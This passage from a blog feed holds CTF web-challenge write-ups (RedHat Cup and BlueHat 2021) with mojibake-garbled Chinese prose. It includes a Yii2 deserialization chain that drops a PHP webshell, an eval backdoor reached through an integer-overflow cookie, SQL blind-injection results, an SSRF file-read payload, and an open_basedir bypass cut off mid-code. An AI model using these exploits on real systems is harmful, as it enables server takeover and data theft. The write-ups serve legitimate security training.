src="/article/ciscn2021/image-20210517144130169.png" class="" title="image-20210517144130169" loading="lazy">]]></content>
    
    
    <summary type="html">&lt;p&gt;Ciscn 2021&lt;/p&gt;
&lt;p&gt;é˜Ÿä¼åç§°ï¼šS3C_2021&lt;/p&gt;</summary>
    
    
    
    <category term="Write-Up" scheme="https://err0r.top/categories/Write-Up/"/>
    
    
  </entry>
  
  <entry>
    <title>çº¢å¸½æ¯2021</title>
    <link href="https://err0r.top/article/redhat2021/"/>
    <id>https://err0r.top/article/redhat2021/</id>
    <published>2021-05-09T12:43:09.000Z</published>
    <updated>2021-06-06T13:33:56.821Z</updated>
    
    <content type="html"><![CDATA[<p>Webä½“éªŒè¿˜è¡Œï¼Œä¸æ˜¯å¤ªéš¾ï¼Œå‹è½´é¢˜å¾ˆåˆç†</p><a id="more"></a><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="find-it"><a href="#find-it" class="headerlink" title="find_it"></a>find_it</h3><p>é¢˜ç›®æ²¡å•¥æ„æ€23333ï¼Œè¿˜è€æ˜¯503</p><p>æ‰«ä¸‹ç›®å½•ï¼Œè®¿é—®<code>robots.txt</code> ï¼Œå¾—åˆ°<code>1ndexx.php</code>ï¼Œè®¿é—®é¡µé¢500æŠ¥é”™ï¼Œåº”è¯¥æ˜¯ç¼ºå‚æ•°ï¼Œæ—¢ç„¶è¿™æ ·é‚£è‚¯å®šè¦ç»™æºç (ä¸ç„¶å¯„åˆ€ç‰‡ä¼ºå€™)</p><p>å‘ç°å¤‡ä»½æ–‡ä»¶<code>.1ndexx.php.swp</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token shell-comment comment">#Really easy...</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Unable 2 open!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$I_know_you_wanna_but_i_will_not_give_you_hhh</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token function">filesize</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$hack</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"hack.php"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Unable 2 open"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\~|\^|\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump/'</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"you die"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">33</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"nonono."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$hack</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$hack</span><span class="token punctuation">,</span><span class="token variable">$I_know_you_wanna_but_i_will_not_give_you_hhh</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$hack</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>banäº†ä¸€å †å‡½æ•°ï¼Œå…ˆçœ‹çœ‹phpinfo</p><p>payloadï¼š</p><pre class="language-php" data-language="php"><code class="language-php">./?code=<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>è®¿é—®<code>hack.php</code></p><p>æœç´¢å­—ç¬¦ä¸²ï¼Œç»“æœå‘ç°flagå†™åœ¨äº†ç¯å¢ƒå˜é‡é‡Œï¼Œè¢«phpinfoæš´éœ²å‡ºæ¥äº†</p><img src="/article/redhat2021/image-20210509205559176.png" class="" title="web1flag" loading="lazy"><p>è¯´å®è¯ï¼Œ<code>1ndexx.php</code>å’Œ<code>index.php</code> åˆ‡æ¢è¿·æƒ‘äººï¼Œç„¶åå¹³å°çš„é—®é¢˜ï¼Œç›²çŒœdockeråˆ†å‘å†™ç¯å¢ƒå˜é‡ï¼Œæœ€åæ²¡åˆ 23333</p><hr><h3 id="framework"><a href="#framework" class="headerlink" title="framework"></a>framework</h3><p>æ‰«åˆ°<code>www.zip</code>ï¼Œçœ‹ä¸‹æ˜¯<a href="http://github.com/yiisoft/yii2/">Yii Framework2.0.32</a></p><p>å»å®˜ç½‘ä¸‹åŸç‰ˆæ¯”å¯¹ä¸€ä¸‹ï¼Œå‘ç°å°±æ”¹äº†ä¸ªå‚æ•°</p><h4 id="Yii2ååºåˆ—åŒ–æ¼æ´"><a href="#Yii2ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="Yii2ååºåˆ—åŒ–æ¼æ´"></a><a href="https://www.cnblogs.com/thresh/p/13743081.html">Yii2ååºåˆ—åŒ–æ¼æ´</a></h4><p>æ‹¿pocç›´æ¥æ‰“ï¼Œç”±äºbase64åå¯èƒ½ä¼šæœ‰<code>/</code>æˆ–è€…<code>+</code>ç­‰ï¼Œæ‰€ä»¥å…ˆbase64ä¸€ä¸‹å†™å‡½æ•°è§£ç å³å¯</p><p>systemä¼¼ä¹è¢«banäº†ä¸è¡Œ</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>rest</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name">CreateAction</span><span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$checkAccess</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">checkAccess</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'assert'</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">id</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"file_put_contents('1.php',base64_decode('PD9waHAgZXZhbCgkX1BPU1RbYV0pPz4='))"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Faker</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>CreateAction</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">Generator</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$formatters</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token comment">// è¿™é‡Œéœ€è¦æ”¹ä¸ºisRunning</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'isRunning'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">CreateAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'run'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// poc2</span><span class="token keyword">namespace</span> <span class="token package">Codeception<span class="token punctuation">\</span>Extension</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">Faker<span class="token punctuation">\</span>Generator</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">RunProcess</span><span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$processes</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">processes</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Generator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span><span class="token punctuation">&#123;</span>    <span class="token comment">// ç”Ÿæˆpoc</span>    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Codeception<span class="token punctuation">\</span>Extension<span class="token punctuation">\</span>RunProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>è¿™é‡ŒåŸpocæ‰“çš„å‚æ•°æ˜¯dataï¼Œè¿™é‡Œä¿®æ”¹ä¸ºmessage</p><img src="/article/redhat2021/image-20210509210754051.png" class="" title="message" loading="lazy"><p>æ‰“è¿‡å»å°±è¡Œï¼Œè™½ç„¶æŠ¥é”™ä½†æ˜¯å·²ç»æ‰§è¡Œäº†</p><img src="/article/redhat2021/36771C01-40D6-4C62-A2C3-A38B1D6CE696.png" class="" title="poc" loading="lazy"><p>åœ¨å½“å‰ç›®å½•ä¼šç”Ÿæˆ<code>1.php</code>ï¼Œèšå‰‘è¿ä¸€ä¸‹</p><img src="/article/redhat2021/image-20210509211521847.png" class="" title="getshell" loading="lazy"><p>å‘ç°æœ‰disable_functionï¼Œå½“æ—¶å¿ƒå‡‰ä¸€æˆªï¼Œä¸ä¼šå’Œè“å¸½ä¸€æ ·â€¦</p><p>ä¾¥å¹¸å¿ƒç†æµ‹äº†ä¸‹èšå‰‘çš„çªç ´æ’ä»¶ï¼Œå‘ç°<code>Apache_mod_cgi</code>å¯ä»¥ï¼Œæ‰§è¡Œæ ¹ç›®å½•ä¸‹<code>/readflag</code>å³å¯</p><img src="/article/redhat2021/image-20210509211350611.png" class="" title="web2flag" loading="lazy"><hr><h3 id="WebsiteManger"><a href="#WebsiteManger" class="headerlink" title="WebsiteManger"></a>WebsiteManger</h3><p>æ‰“å¼€ç™»é™†ç•Œé¢ï¼Œä¼°è®¡æ˜¯æ³¨å…¥</p><p>çœ‹çœ‹è¿æ¥ï¼Œå‘ç°å¼‚å¸¸è¯·æ±‚ï¼Œè¿˜å¥½æ²¡ä¸Šæ¥å¯¹ç€<code>username</code>ä¹±è¯•</p><img src="/article/redhat2021/image-20210509212002489.png" class="" title="imagephp" loading="lazy"><p>ç»æµ‹è¯•ï¼Œå¯ä»¥ä½¿ç”¨å¼‚æˆ– ç›²æ³¨</p><pre class="language-none"><code class="language-none">é”™è¯¯è¯­å¥è¿”å›æŠ¥é”™æ­£ç¡®è¯­å¥é”™è¯¯è¡¨è¾¾è¿”å›ï¼šWHAT ARE YOU DOINGæ­£ç¡®è¯­å¥idä¸º1è¿”å›å›¾ç‰‡æ­£ç¡®è¯­å¥idä¸º0è¿”å›ç©º</code></pre><img src="/article/redhat2021/image-20210509212509022.png" class="" title="1^1" loading="lazy"><img src="/article/redhat2021/image-20210509212527090.png" class="" title="1^0" loading="lazy"><img src="/article/redhat2021/image-20210509212645414.png" class="" title="error" loading="lazy"><p>å¼‚æˆ–ç›²æ³¨è„šæœ¬è·‘ï¼Œå¯è§ä»¥å‰å†™çš„WP</p><p>æ‹¿åˆ°ä¿¡æ¯å¦‚ä¸‹</p><pre class="language-none"><code class="language-none"># version&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;5.5.60-0+deb8u1# databases&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;ctf# tables&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;images,users# users.columns&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;username,password# users.data&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;admin~a1d4f79c94f0cd3feeac4</code></pre><p>ä¼¼ä¹å¯†ç è¿˜æ˜¯å®¹å™¨éšæœºçš„ï¼Œæ‹¿åˆ°ç”¨æˆ·åå¯†ç ç™»é™†</p><img src="/article/redhat2021/image-20210509213045341.png" class="" title="ssrf" loading="lazy"><p>æ˜æ˜¾ssrfï¼Œç”¨fileåè®®è¯»ä¸€ä¸‹æ–‡ä»¶å¯è¡Œï¼Œç›´æ¥è¯»flag</p><p>payloadï¼š</p><pre class="language-none"><code class="language-none">file:&#x2F;&#x2F;&#x2F;flag</code></pre><img src="/article/redhat2021/image-20210509213219524.png" class="" title="web3flag" loading="lazy">]]></content>
    
    
    <summary type="html">&lt;p&gt;Webä½“éªŒè¿˜è¡Œï¼Œä¸æ˜¯å¤ªéš¾ï¼Œå‹è½´é¢˜å¾ˆåˆç†&lt;/p&gt;</summary>
    
    
    
    <category term="Write-Up" scheme="https://err0r.top/categories/Write-Up/"/>
    
    
  </entry>
  
  <entry>
    <title>è“å¸½æ¯2021ä¸€é“é¢˜â€”â€”One_Pointer_PHP</title>
    <link href="https://err0r.top/article/bluehat2021/"/>
    <id>https://err0r.top/article/bluehat2021/</id>
    <published>2021-05-02T05:04:27.000Z</published>
    <updated>2021-05-03T07:48:09.206Z</updated>
    
    <content type="html"><![CDATA[<p>æ·±å…¥å­¦ä¹ è“å¸½æ¯webä¸€é“é¢˜</p><a id="more"></a><p>è´¨é‡å¾ˆé«˜çš„ä¸€é“é¢˜ï¼Œè¯¦ç»†å†™ä¸‹åšä¸ªæ€»ç»“ï¼Œæ·±å…¥å­¦ä¹ ä¸€ä¸‹çŸ¥è¯†ç‚¹</p><h2 id="WEB-One-Pointer-PHP"><a href="#WEB-One-Pointer-PHP" class="headerlink" title="WEB-One_Pointer_PHP"></a>WEB-One_Pointer_PHP</h2><h3 id="ç¬¬ä¸€å±‚"><a href="#ç¬¬ä¸€å±‚" class="headerlink" title="ç¬¬ä¸€å±‚"></a>ç¬¬ä¸€å±‚</h3><p>ç»™äº†<code>www.zip</code>ï¼Œéƒ¨åˆ†æºç ï¼Œåˆ†æä¸€ä¸‹</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$count</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$count</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">count</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$count</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">count</span><span class="token operator">+</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"data"</span><span class="token punctuation">,</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"backdoor"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$user</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">;</span><span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">count</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"data"</span><span class="token punctuation">,</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>ååºåˆ—åŒ–<code>cookies-&gt;data</code>ä½¿å…¶$count[++$user-&gt;count]=1;å<code>$count[]=1</code>ä¸ºfalseå³å¯evalæ‰§è¡Œå‘½ä»¤ï¼Œä¼´éšåº”è¯¥é¢˜ç›®è¿˜æœ‰æ›´å¤šè€ƒç‚¹ï¼Œæµ‹è¯•å¦‚ä¸‹ã€‚</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$count</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">count</span> <span class="token operator">=</span> <span class="token number">9223372036854775806</span><span class="token punctuation">;</span><span class="token variable">$user</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$count</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">count</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$count</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$count</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"die"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"success"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><img src="/article/bluehat2021/image-20210503132210543.png" class="" title="count-test" loading="lazy"><p>åœ¨ PHP ä¸­ï¼Œæœ‰ä¸‰ç§æ•°ç»„ç±»å‹ï¼š</p><ul><li><p>ç´¢å¼•æ•°ç»„ - å¸¦æœ‰æ•°å­—ç´¢å¼•çš„æ•°ç»„</p><p> <code>$a = array(&quot;1&quot; =&gt; &quot;admin&quot;, &quot;0&quot; =&gt; &quot;gyy&quot;);</code>  // keyè¢«åŒå¼•å·åŒ…è£¹</p></li><li><p>å…³è”æ•°ç»„ - å¸¦æœ‰æŒ‡å®šé”®çš„æ•°ç»„</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$value</span> <span class="token operator">=</span> <span class="token number">9223372036854775805</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$value</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$value</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$value</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$value</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$key</span><span class="token punctuation">&#125;</span></span> => <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$value</span><span class="token punctuation">&#125;</span></span>\r\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token variable">$value</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// ç»“æœå¦‚ä¸‹</span><span class="token comment">//array(3) &#123;</span><span class="token comment">//    [9223372036854775806]=></span><span class="token comment">//  int(1)</span><span class="token comment">//  [9223372036854775807]=></span><span class="token comment">//  int(1)</span><span class="token comment">//  [-9223372036854775808]=></span><span class="token comment">//  int(1)</span><span class="token comment">//&#125;</span><span class="token comment">//9223372036854775806 => 1</span><span class="token comment">//9223372036854775807 => 1</span><span class="token comment">//-9223372036854775808 => 1</span><span class="token comment">//bool(true)</span><span class="token delimiter important">?></span></span></code></pre></li><li><p>å¤šç»´æ•°ç»„ - åŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªæ•°ç»„çš„æ•°ç»„</p><p>ä¿—ç§°å¥—å¨ƒ</p></li></ul><p>æ„Ÿå…´è¶£çš„å¸ˆå‚…å¯ä»¥è‡ªå·±æµ‹è¯•ä¸€ä¸‹ï¼Œè¿™é‡Œåªéœ€è¦<code>$a-&gt;count=9223372036854775806</code>å³longæœ€å¤§å€¼æ—¶å³å¯ç»•è¿‡(64ä½å³2^64)</p><h3 id="è·å–webshell"><a href="#è·å–webshell" class="headerlink" title="è·å–webshell"></a>è·å–webshell</h3><p>ç›´æ¥æ‹¿shellè¿›å»çœ‹çœ‹</p><img src="/article/bluehat2021/image-20210503134715662.png" class="" title="shell" loading="lazy"><p>è¿™é‡Œç”¨èšå‰‘ç¤ºä¾‹ï¼Œæ³¨æ„headeré‡Œéœ€è¦åŠ Cookieä¸º<code>data=O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22count%22%3Bi%3A9223372036854775806%3B%7D;</code></p><p>æŸ¥çœ‹phpinfoï¼Œå‘ç°æœ‰å¾ˆå¤šdisable_function</p><pre class="language-none"><code class="language-none">disable_functionï¼šstream_socket_client,fsockopen,putenv,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,iconv,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,error_log,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursivedisable_classes:Exception,SplDoublyLinkedList,Error,ErrorException,ArgumentCountError,ArithmeticError,AssertionError,DivisionByZeroError,CompileError,ParseError,TypeError,ValueError,UnhandledMatchError,ClosedGeneratorException,LogicException,BadFunctionCallException,BadMethodCallException,DomainException,InvalidArgumentException,LengthException,OutOfRangeException,PharException,ReflectionException,RuntimeException,OutOfBoundsException,OverflowException,PDOException,RangeException,UnderflowException,UnexpectedValueException,JsonException,SodiumException</code></pre><p>è¿˜æœ‰open_basediré™åˆ¶ï¼Œåˆ©ç”¨è‡ªåŠ¨åŒ–è„šæœ¬æ— æ³•çªç ´ã€‚ç”±äºhtmlç›®å½•å¯å†™ï¼Œåˆ©ç”¨<code>glob://</code>åè®®å…ˆæ¢æµ‹ç›®å½•</p><blockquote><p>glob:// â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼</p></blockquote><pre class="language-none"><code class="language-none">&lt;?phpprintf(&#39;&lt;b&gt;open_basedir : %s &lt;&#x2F;b&gt;&lt;br &#x2F;&gt;&#39;, ini_get(&#39;open_basedir&#39;));$file_list &#x3D; array();&#x2F;&#x2F; normal files$it &#x3D; new DirectoryIterator(&quot;glob:&#x2F;&#x2F;&#x2F;*&quot;);foreach($it as $f) &#123;    $file_list[] &#x3D; $f-&gt;__toString();&#125;&#x2F;&#x2F; special files (starting with a dot(.))$it &#x3D; new DirectoryIterator(&quot;glob:&#x2F;&#x2F;&#x2F;.*&quot;);foreach($it as $f) &#123;    $file_list[] &#x3D; $f-&gt;__toString();&#125;sort($file_list);foreach($file_list as $f)&#123;        echo &quot;&#123;$f&#125;&lt;br&#x2F;&gt;&quot;;&#125;?&gt;</code></pre><img src="/article/bluehat2021/image-20210503135244699.png" class="" title="flag" loading="lazy"><p>å†åˆ©ç”¨å¦‚ä¸‹ï¼Œè¯»å–æ–‡ä»¶</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'gyy'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'gyy'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'open_basedir'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token 